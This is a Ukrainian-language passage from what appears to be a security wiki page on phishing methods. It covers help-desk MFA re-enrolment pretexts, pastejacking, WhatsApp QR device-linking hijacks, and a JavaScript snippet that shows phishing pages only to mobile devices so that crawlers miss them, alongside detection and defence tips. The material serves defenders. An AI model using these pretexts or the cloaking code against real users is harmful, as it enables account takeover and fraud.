Окрім класичного push-bombing, operators просто **примусово запускають нову MFA registration** під час help-desk call, анулюючи наявний token користувача. Будь-який наступний login prompt виглядає для жертви легітимним.
```text
[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```
Відстежуйте події AzureAD/AWS/Okta, у яких **`deleteMFA` + `addMFA`** відбуваються **протягом кількох хвилин з однієї IP-адреси**.



## Clipboard Hijacking / Pastejacking

Зловмисники можуть непомітно скопіювати шкідливі команди до буфера обміну жертви зі скомпрометованої або typosquatted вебсторінки, а потім змусити користувача вставити їх у **Win + R**, **Win + X** або вікно термінала, виконавши довільний код без будь-якого завантаження чи вкладення.


{{#ref}}
clipboard-hijacking.md
{{#endref}}

## Mobile Phishing & Malicious App Distribution (Android & iOS)


{{#ref}}
mobile-phishing-malicious-apps.md
{{#endref}}

### WhatsApp device-linking hijack via QR social engineering
* Сторінка-приманка (наприклад, фальшивий “канал” міністерства/CERT) відображає QR-код WhatsApp Web/Desktop і вказує жертві відсканувати його, непомітно додаючи зловмисника як **linked device**.<sup>[[12]](#references)</sup>
* Зловмисник одразу отримує доступ до перегляду чатів і контактів, доки сесію не буде видалено. Пізніше жертви можуть побачити сповіщення “new device linked”; захисники можуть шукати неочікувані події linking device, що відбулися невдовзі після відвідування ненадійних QR-сторінок.

### Mobile‑gated phishing to evade crawlers/sandboxes
Оператори дедалі частіше обмежують свої phishing-потоки простою перевіркою пристрою, щоб desktop crawlers ніколи не переходили до фінальних сторінок. Поширений шаблон — невеликий скрипт, який перевіряє наявність DOM із підтримкою touch і надсилає результат на server endpoint; немобільні клієнти отримують HTTP 500 (або порожню сторінку), тоді як mobile-користувачам надається повний потік.<sup>[[7]](#references)</sup>

Minimal client snippet (typical logic):
```html
<script src="/static/detect_device.js"></script>
```
Логіка `detect_device.js` (спрощено):
```javascript
const isMobile = ('ontouchstart' in document.documentElement);
fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
.then(()=>location.reload());
```
Поведінка сервера, яку часто спостерігають:
- Встановлює session cookie під час першого завантаження.
- Приймає `POST /detect {"is_mobile":true|false}`.
- Повертає 500 (або placeholder) для наступних GET-запитів, коли `is_mobile=false`; обслуговує phishing лише якщо значення `true`.

Евристики пошуку та виявлення:
- Запит urlscan: `filename:"detect_device.js" AND page.status:500`
- Web telemetry: послідовність `GET /static/detect_device.js` → `POST /detect` → HTTP 500 для non-mobile; легітимні шляхи mobile-жертв повертають 200 із подальшим HTML/JS.
- Блокуйте або ретельно перевіряйте сторінки, які обумовлюють вміст виключно наявністю `ontouchstart` або подібними перевірками пристрою.

Поради щодо захисту:
- Запускайте crawlers із mobile-подібними fingerprints і ввімкненим JS, щоб виявляти gated content.
- Створюйте alert для підозрілих відповідей 500 після `POST /detect` на нещодавно зареєстрованих доменах.

## References

- [1] [Генерування варіантів доменів, що використовуються у phishing (Zeltser)](https://zeltser.com/domain-name-variations-in-phishing/)
- [2] [Пошук phishing: інструменти та методи (0xPatrik)](https://0xpatrik.com/phishing-domains/)
- [3] [Викрадення облікових даних і обхід 2FA за допомогою noVNC (mr.d0x)](https://mrd0x.com/bypass-2fa-using-novnc/)
- [4] [Викрадення сесій і обхід 2FA за допомогою EvilnoVNC (darkbyte.net)](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
- [5] [Як встановити та налаштувати DKIM із Postfix у Debian Wheezy (DigitalOcean)](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
- [6] [Глобальний звіт Unit 42 про реагування на інциденти за 2025 рік — видання про соціальну інженерію](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
- [7] [Тихий smishing — mobile-gated phishing-інфраструктура та евристики (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
- [8] [Наступний рубіж атак runtime assembly: використання LLM для генерації phishing JavaScript у реальному часі](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)
- [9] [Імітація особи, click hijacking і TDS: всередині екосистеми розповсюдження malware](https://research.checkpoint.com/2026/impersonation-click-hijacking-and-tds-inside-a-malware-distribution-ecosystem/)
- [10] [Bitsquatting Windows.com (Remy Hax)](https://remyhax.xyz/posts/bitsquatting-windows/)
- [11] [Перехоплення трафіку до windows.com від Microsoft за допомогою bitflipping (BleepingComputer)](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)
- [12] [Кохання? Насправді: підроблений dating app використано як приманку в цільовій spyware-кампанії в Пакистані](https://www.welivesecurity.com/en/eset-research/love-actually-fake-dating-app-used-lure-targeted-spyware-campaign-pakistan/)
- [13] [IoC і зразки ESET GhostChat](https://github.com/eset/malware-ioc/tree/master/ghostchat)
{{#include ../../banners/hacktricks-training.md}}
